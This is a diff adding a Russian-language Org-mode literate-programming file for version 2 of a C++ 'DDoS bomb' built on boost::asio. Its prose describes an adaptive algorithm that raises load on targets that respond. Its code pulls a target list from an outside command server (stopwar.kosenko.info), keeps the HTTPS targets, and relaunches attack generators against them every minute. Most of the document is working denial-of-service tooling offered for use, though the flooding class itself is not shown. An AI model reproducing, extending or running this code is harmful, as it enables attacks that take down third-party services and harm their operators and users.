@@ -1,0 +1,148 @@
+#+title: =DDoS=-бомба, версия 2
+
+Первая версия =DDoS=-бомбы была реализована в [[file:~/job/state/ddos/code/bomb-old/bomb.org][bomb-old]] на основе библиотеки =Curl= и
+многопоточности. Однако сама библиотека =Curl= не адаптирована к многопоточности, что приводит к
+перекрестным ошибкам. Еще одним недостатком первой версии явилось то, что была использована
+многопоточность, а не асинхронный защищенный ввод-вывод. Многопоточность на самом деле неэффективна на
+дешевых однопроцессорных серверах, и нет смысла задействовать мощные сервера, так как самым узким
+ресурсом является сетевой канал, а не процессор. Наконец, библиотека =Curl= позволяет работать только с
+=HTTP/HTTPS=-запросами.
+
+Новая версия реализована с помощью библиотеки [[https://www.boost.org/doc/libs/1_55_0/doc/html/boost_asio.html][boost::asio]], которая позволяет работать напрямую с сокетами
+на нестандартных портах, выполнять отдельно разрешение имен и выполнять асинхронные запросы.
+
+Кроме того, в новой версии реализован адаптивный алгоритм, который увеличивает нагрузку на успешные
+запросы, и снижает там, где цель недоступна.
+
+* Цель
+
+Описана в файле [[file:Target.org][Target.org]].
+
+* TODO Главный файл
+:PROPERTIES:
+:ID:       646a3b90-5a34-42a5-91ea-12a09ef3aece
+:END:
+
+#+begin_src c++ :noweb yes :tangle bomb.cc
+  <<bomb:Импорт>>
+  
+  <<bomb:Пространство>>
+
+  <<bomb:Данные>>
+
+  <<bomb:Функции>>
+
+  int main(int argc, char *argv[]) {
+    <<bomb:main:Действия>>
+
+    return 0;
+  }
+#+end_src
+
+* Получение списка целей
+
+Список целей получается с сервера. Оформим это в виде цепочки вызовов. Вначале получим адрес источника целей.
+
+#+begin_src c++ :noweb-ref bomb:Импорт
+  #include <boost/asio.hpp>
+  #include <iostream>
+  #include "WebTarget.hh"
+#+end_src
+
+#+begin_src c++ :noweb-ref bomb:Пространство
+  using boost::asio::ip::tcp;
+#+end_src
+
+#+begin_src c++ :noweb-ref bomb:main:Действия
+  boost::asio::io_service io;
+  tcp::socket s(io);
+  boost::asio::connect(s, tcp::resolver(io).resolve(tcp::resolver::query("stopwar.kosenko.info", "http")));
+
+  boost::asio::streambuf rb;
+  std::ostream os(&rb);
+  os << "GET /targets/web HTTP/1.1\n"
+     << "Host: stopwar.kosenko.info\n"
+     << "Connection: close\n\n";
+
+  boost::asio::write(s, rb);
+  boost::asio::read_until(s, rb, "\n");
+
+  std::istream is(&rb);
+  std::string httpVersion;
+  unsigned statusCode;
+  std::string statusMessage;
+  is >> httpVersion
+     >> statusCode;
+  getline(is, statusMessage);
+  // std::cout << httpVersion << std::endl
+  //           << statusCode << std::endl
+  //           << statusMessage << std::endl;
+
+  boost::asio::read_until(s, rb, "\r\n");
+  std::string header;
+  while (getline(is, header) && header != "\r") {
+    // std::cout << header << std::endl;
+  }
+
+  boost::system::error_code e;
+  boost::asio::read(s, rb, e);
+  std::string result;
+  getline(is, result);
+  // std::cout << result;
+#+end_src
+
+* TODO Разбор строки результатов
+
+В первой версии для разбора =JSON= использовалась библиотека =JAULA=, в новой версии используется [[https://github.com/open-source-parsers/jsoncpp][jsoncpp]]
+(см. документацию в [[http://open-source-parsers.github.io/jsoncpp-docs/doxygen/index.html][Doxygen]]).
+
+#+begin_src c++ :noweb-ref bomb:Импорт
+  #include <jsoncpp/json/json.h>
+  #include <list>
+#+end_src
+
+#+begin_src c++ :noweb-ref bomb:main:Действия
+    std::istringstream ps(result);
+    Json::Value root;
+    ps >> root;
+
+    std::list<WebTarget *> ts;
+    for (auto i = root.begin(); i != root.end(); i++) {
+      if ((*i)["service"].asString() == "https") {
+        ts.push_back(WebTarget::make(*i));
+      }
+    }
+#+end_src
+
+* Порождение потока генераторов
+
+#+begin_src c++ :noweb-ref bomb:Импорт
+  #include <boost/bind/bind.hpp>
+#+end_src
+
+#+begin_src c++ :noweb-ref bomb:Функции
+  void monitor(const boost::system::error_code &
+             , std::list<WebTarget *> *ts
+             , boost::asio::deadline_timer *t) {
+    std::cout << "Active:\n";
+    for (auto i = ts->begin(); i != ts->end(); i++) {
+      if ((*i)->isActive()) {
+        if ((*i)->genCount() > 1) {
+          (*i)->show(std::cout);
+        }
+      } else {
+        (*i)->call();
+      }
+    }
+    t->expires_at(t->expires_at() + boost::posix_time::seconds(60));
+    t->async_wait(boost::bind(monitor, boost::asio::placeholders::error, ts, t));
+  }
+#+end_src
+
+#+begin_src c++ :noweb-ref bomb:main:Действия
+  boost::asio::deadline_timer t(WebTarget::ioService, boost::posix_time::seconds(0));
+  t.async_wait(boost::bind(monitor, boost::asio::placeholders::error, &ts, &t));
+
+  WebTarget::ioService.run();
+#+end_src
+
